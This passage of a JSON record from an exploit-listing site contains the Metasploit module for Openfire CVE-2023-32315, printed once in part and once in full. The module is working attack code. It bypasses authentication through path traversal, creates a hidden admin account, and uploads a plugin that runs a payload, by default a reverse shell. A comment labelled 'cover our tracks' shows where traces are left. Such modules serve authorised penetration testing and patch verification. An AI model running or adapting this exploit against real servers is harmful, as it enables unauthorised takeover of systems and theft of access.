datastore['ADMINNAME'] || Rex::Text.rand_text_alpha_lower(8..15)\n    password = Rex::Text.rand_password(8..10)\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-create.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'vars_get' => {\n        'csrf' => @csrf_token.to_s,\n        'username' => username.to_s,\n        'password' => password.to_s,\n        'passwordConfirm' => password.to_s,\n        'isadmin' => 'on',\n        'create' => 'Create+User'\n      }\n    })\n    # path traversal throws a java exception error 500 and/or returns a 200 OK code not matter if the user is added or not,\n    # so we have to check during the login of the new admin user if we have been successful here\n    if res && res.code == 200 || res.code == 500\n      @admin_login['username'] = username\n      @admin_login['password'] = password\n    end\n    return @admin_login\n  end\n\n  def login_admin_user\n    # login using admin hash with admin username and password\n    # returns true if login successful else returns false\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi!({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'url' => '%2Findex.jsp',\n        'login' => 'true',\n        'csrf' => @csrf_token.to_s,\n        'username' => @admin_login['username'].to_s,\n        'password' => @admin_login['password'].to_s\n      }\n    })\n    if res && res.code == 200 && res.body.match(/login box/).nil?\n      store_valid_credential(user: @admin_login['username'], private: @admin_login['password'], proof: cookie_jar.cookies)\n      return true\n    else\n      return false\n    end\n  end\n\n  def prepare_plugin_jar\n    # prepares the plugin foundation that will host the payload\n    files = [\n      [ 'logo_large.gif' ],\n      [ 'logo_small.gif' ],\n      [ 'readme.html' ],\n      [ 'changelog.html' ],\n      [ 'lib', 'plugin-metasploit.jar' ]\n    ]\n\n    jar = Rex::Zip::Jar.new\n    jar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin'))\n\n    @plugin_name = datastore['PLUGINNAME'] || Rex::Text.rand_text_alphanumeric(8..15)\n    plugin_author = datastore['PLUGINAUTHOR'] || Rex::Text.rand_text_alphanumeric(8..15)\n    plugin_desc = datastore['PLUGINDESC'] || Rex::Text.rand_text_alphanumeric(8..15)\n\n    plugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin', 'plugin.xml'))\n    plugin_xml.gsub!(/PLUGINNAME/, @plugin_name)\n    plugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)\n    plugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)\n\n    jar.add_file('plugin.xml', plugin_xml)\n    return jar\n  end\n\n  def upload_and_execute_plugin(plugin_jar)\n    # upload and execute Openfire plugin with encoded payload\n    # returns true if upload is successful else returns false\n\n    # construct multipart form data\n    form_data = Rex::MIME::Message.new\n    form_data.add_part(plugin_jar.to_s, 'application/x-java-archive', 'binary', \"form-data; name=\\\"uploadfile\\\"; filename=\\\"#{@plugin_name}.jar\\\"\")\n\n    # extract the csrf token\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'plugin-admin.jsp'),\n      'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",\n      'keep_cookies' => true,\n      'data' => form_data.to_s,\n      'vars_get' => {\n        'uploadplugin' => nil,\n        'csrf' => @csrf_token.to_s\n      }\n    })\n    # with a successfull upload and execution of the plugin, no response is returned.\n    return true unless res\n    # safety check if, for whatever reason, we get a 302 response back\n    if res.code == 302 && res.headers.to_s.match(/uploadsuccess=true/)\n      return true\n    else\n      return false\n    end\n  end\n\n  def check\n    openfire_version = get_version\n    return CheckCode::Safe if openfire_version.nil?\n    # check first for patched versions\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.6.8')\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.7.5')\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.8.0')\n\n    if openfire_version < Rex::Version.new('4.8.0') && openfire_version >= Rex::Version.new('3.10.0')\n      CheckCode::Appears(\"Openfire version is #{openfire_version}\")\n    else\n      CheckCode::Safe(\"Openfire version is #{openfire_version}\")\n    end\n  end\n\n  def exploit\n    # gain access exploiting path traversal vulnerability\n    print_status('Grabbing the cookies.')\n    fail_with(Failure::NoAccess, 'Authentication bypass is not successful.') unless auth_bypass\n\n    # add a new admin user\n    print_status('Adding a new admin user.')\n    fail_with(Failure::NoAccess, 'Adding a new admin user is not successful.') if add_admin_user.empty?\n\n    # login with new admin account\n    print_status(\"Logging in with admin user \\\"#{@admin_login['username']}\\\" and password \\\"#{@admin_login['password']}\\\".\")\n    fail_with(Failure::NoAccess, 'Login is not successful.') unless login_admin_user\n\n    # prepare Openfire plugin with payload\n    plugin = prepare_plugin_jar\n    plugin.add_file(\"lib/#{rand_text_alphanumeric(8)}.jar\", payload.encoded_jar.pack)\n    plugin.build_manifest\n\n    # upload and execute Openfire plugin with payload\n    print_status(\"Upload and execute plugin \\\"#{@plugin_name}\\\" with payload \\\"#{datastore['PAYLOAD']}\\\".\")\n    fail_with(Failure::PayloadFailed, 'Upload and/or execution of the plugin is not successful.') unless upload_and_execute_plugin(plugin.pack)\n\n    # cover our tracks!!!\n    # remove plugin and newly added admin user\n    # Automatic removal of plugin and admin user might cause instability in the application,\n    # so remove it manually in Openfire Management console after the exploit is completed.\n    print_warning(\"Plugin \\\"#{@plugin_name}\\\" need manually clean-up via Openfire Admin console.\")\n    print_warning(\"Admin user \\\"#{@admin_login['username']}\\\" need manually clean-up via Openfire Admin console.\")\n  end\nend", "language": "bash"}, {"title": "Openfire authentication bypass with RCE plugin", "score": 7.3, "href": "https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/openfire_auth_bypass_rce_cve_2023_32315.rb", "type": "metasploit", "published": "2023-07-08", "id": "MSF:EXPLOIT-MULTI-HTTP-OPENFIRE_AUTH_BYPASS_RCE_CVE_2023_32315-", "source": "## https://sploitus.com/exploit?id=MSF:EXPLOIT-MULTI-HTTP-OPENFIRE_AUTH_BYPASS_RCE_CVE_2023_32315-\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Openfire authentication bypass with RCE plugin',\n        'Description' => %q{\n          Openfire is an XMPP server licensed under the Open Source Apache License.\n          Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack\n          via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment\n          in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for\n          administrative users.\n          This module will use the vulnerability to create a new admin user that will be used to upload a Openfire management plugin\n          weaponised with java native payload that triggers an RCE.\n          This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0.\n          The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the\n          first version on the 4.8 branch, which is version 4.8.0.\n        },\n        'Author' => [\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-32315'],\n          ['URL', 'https://attackerkb.com/topics/7Tf5YGY3oT/cve-2023-32315'],\n          ['URL', 'https://github.com/miko550/CVE-2023-32315'],\n          ['URL', 'https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm']\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => [ 'java' ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_JAVA ],\n        'Targets' => [\n          [\n            'Java Universal',\n            {\n              'Platform' => 'java',\n              'Arch' => ARCH_JAVA,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'java/shell/reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2023-05-26',\n        'DefaultOptions' => {\n          'SSL' => false,\n          'RPORT' => 9090\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to the web application', '/']),\n        OptString.new('PLUGINNAME', [ false, 'Openfire plugin base name, (default: random)' ]),\n        OptString.new('PLUGINAUTHOR', [ false, 'Openfire plugin author, (default: random)' ]),\n        OptString.new('PLUGINDESC', [ false, 'Openfire plugin description, (default: random)' ]),\n        OptString.new('ADMINNAME', [ false, 'Openfire admin user name, (default: random)' ]),\n      ]\n    )\n  end\n\n  def get_version\n    # get Openfire version number from the admin console login page\n    openfire_version = nil\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded'\n    })\n    if res && res.code == 200\n      version = res.body.match(/Openfire,\\s*\\D*:\\s*\\d\\.\\d{1,2}\\.\\d/)\n      openfire_version = Rex::Version.new(version[0].split(':')[1].strip) unless version.nil?\n    end\n\n    openfire_version\n  end\n\n  def auth_bypass\n    # bypass authentication using path traversal vulnerability and return true if cookie_jar is filled (JSESSION-ID and CSRF) else return false.\n    send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-groups.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true\n    })\n    return false if cookie_jar.cookies.empty?\n\n    cookie_jar.cookies.each do |cookie|\n      print_status(cookie.to_s)\n    end\n    return true\n  end\n\n  def add_admin_user\n    # add an admin user using path traversal vulnerability using the cookies retrieved from authentication bypass.\n    # returns admin login hash with random generated username and password\n    @admin_login = {}\n    username = datastore['ADMINNAME'] || Rex::Text.rand_text_alpha_lower(8..15)\n    password = Rex::Text.rand_password(8..10)\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'setup', 'setup-s', '%u002e%u002e/%u002e%u002e/user-create.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'vars_get' => {\n        'csrf' => @csrf_token.to_s,\n        'username' => username.to_s,\n        'password' => password.to_s,\n        'passwordConfirm' => password.to_s,\n        'isadmin' => 'on',\n        'create' => 'Create+User'\n      }\n    })\n    # path traversal throws a java exception error 500 and/or returns a 200 OK code not matter if the user is added or not,\n    # so we have to check during the login of the new admin user if we have been successful here\n    if res && res.code == 200 || res.code == 500\n      @admin_login['username'] = username\n      @admin_login['password'] = password\n    end\n    return @admin_login\n  end\n\n  def login_admin_user\n    # login using admin hash with admin username and password\n    # returns true if login successful else returns false\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi!({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'login.jsp'),\n      'ctype' => 'application/x-www-form-urlencoded',\n      'keep_cookies' => true,\n      'vars_post' => {\n        'url' => '%2Findex.jsp',\n        'login' => 'true',\n        'csrf' => @csrf_token.to_s,\n        'username' => @admin_login['username'].to_s,\n        'password' => @admin_login['password'].to_s\n      }\n    })\n    if res && res.code == 200 && res.body.match(/login box/).nil?\n      store_valid_credential(user: @admin_login['username'], private: @admin_login['password'], proof: cookie_jar.cookies)\n      return true\n    else\n      return false\n    end\n  end\n\n  def prepare_plugin_jar\n    # prepares the plugin foundation that will host the payload\n    files = [\n      [ 'logo_large.gif' ],\n      [ 'logo_small.gif' ],\n      [ 'readme.html' ],\n      [ 'changelog.html' ],\n      [ 'lib', 'plugin-metasploit.jar' ]\n    ]\n\n    jar = Rex::Zip::Jar.new\n    jar.add_files(files, File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin'))\n\n    @plugin_name = datastore['PLUGINNAME'] || Rex::Text.rand_text_alphanumeric(8..15)\n    plugin_author = datastore['PLUGINAUTHOR'] || Rex::Text.rand_text_alphanumeric(8..15)\n    plugin_desc = datastore['PLUGINDESC'] || Rex::Text.rand_text_alphanumeric(8..15)\n\n    plugin_xml = File.binread(File.join(Msf::Config.data_directory, 'exploits', 'openfire_plugin', 'plugin.xml'))\n    plugin_xml.gsub!(/PLUGINNAME/, @plugin_name)\n    plugin_xml.gsub!(/PLUGINDESCRIPTION/, plugin_desc)\n    plugin_xml.gsub!(/PLUGINAUTHOR/, plugin_author)\n\n    jar.add_file('plugin.xml', plugin_xml)\n    return jar\n  end\n\n  def upload_and_execute_plugin(plugin_jar)\n    # upload and execute Openfire plugin with encoded payload\n    # returns true if upload is successful else returns false\n\n    # construct multipart form data\n    form_data = Rex::MIME::Message.new\n    form_data.add_part(plugin_jar.to_s, 'application/x-java-archive', 'binary', \"form-data; name=\\\"uploadfile\\\"; filename=\\\"#{@plugin_name}.jar\\\"\")\n\n    # extract the csrf token\n    cookie_jar.cookies.each do |cookie|\n      @csrf_token = cookie.to_s.split('=')[1].strip unless cookie.to_s.match(/csrf=/).nil?\n    end\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'plugin-admin.jsp'),\n      'ctype' => \"multipart/form-data; boundary=#{form_data.bound}\",\n      'keep_cookies' => true,\n      'data' => form_data.to_s,\n      'vars_get' => {\n        'uploadplugin' => nil,\n        'csrf' => @csrf_token.to_s\n      }\n    })\n    # with a successfull upload and execution of the plugin, no response is returned.\n    return true unless res\n    # safety check if, for whatever reason, we get a 302 response back\n    if res.code == 302 && res.headers.to_s.match(/uploadsuccess=true/)\n      return true\n    else\n      return false\n    end\n  end\n\n  def check\n    openfire_version = get_version\n    return CheckCode::Safe if openfire_version.nil?\n    # check first for patched versions\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.6.8')\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.7.5')\n    return CheckCode::Safe(\"Openfire version is #{openfire_version}\") if openfire_version == Rex::Version.new('4.8.0')\n\n    if openfire_version < Rex::Version.new('4.8.0') && openfire_version >= Rex::Version.new('3.10.0')\n      CheckCode::Appears(\"Openfire version is #{openfire_version}\")\n    else\n      CheckCode::Safe(\"Openfire version is #{openfire_version}\")\n    end\n  end\n\n  def exploit\n    # gain access exploiting path traversal vulnerability\n    print_status('Grabbing the cookies.')\n    fail_with(Failure::NoAccess, 'Authentication bypass is not successful.') unless auth_bypass\n\n    # add a new admin user\n    print_status('Adding a new admin user.')\n    fail_with(Failure::NoAccess, 'Adding a new admin user is not successful.') if add_admin_user.empty?\n\n    # login with new admin account\n    print_status(\"Logging in with admin user \\\"#{@admin_login['username']}\\\" and password \\\"#{@admin_login['password']}\\\".\")\n    fail_with(Failure::NoAccess, 'Login is not successful.') unless login_admin_user\n\n    # prepare Openfire plugin with payload\n    plugin = prepare_plugin_jar\n    plugin.add_file(\"lib/#{rand_text_alphanumeric(8)}.jar\", payload.encoded_jar.pack)\n    plugin.build_manifest\n\n    # upload and execute Openfire plugin with payload\n    print_status(\"Upload and execute plugin \\\"#{@plugin_name}\\\" with payload \\\"#{datastore['PAYLOAD']}\\\".\")\n    fail_with(Failure::PayloadFailed, 'Upload and/or execution of the plugin is not successful.') unless upload_and_execute_plugin(plugin.pack)\n\n    # cover our tracks!!!\n    # remove plugin and newly added admin user\n    # Automatic removal of plugin and admin user might cause instability in the application,\n    # so remove it manually in Openfire Management console after the exploit is completed.\n    print_warning(\"Plugin \\\"#{@plugin_name}\\\" need manually clean-up via Openfire Admin console.\")\n    print_warning(\"Admin user \\\"#{@admin_login['username']}\\\" need manually clean-up via Openfire Admin console.\")\n  end\nend", "language": "RUBY"}], "exploits_total": 10}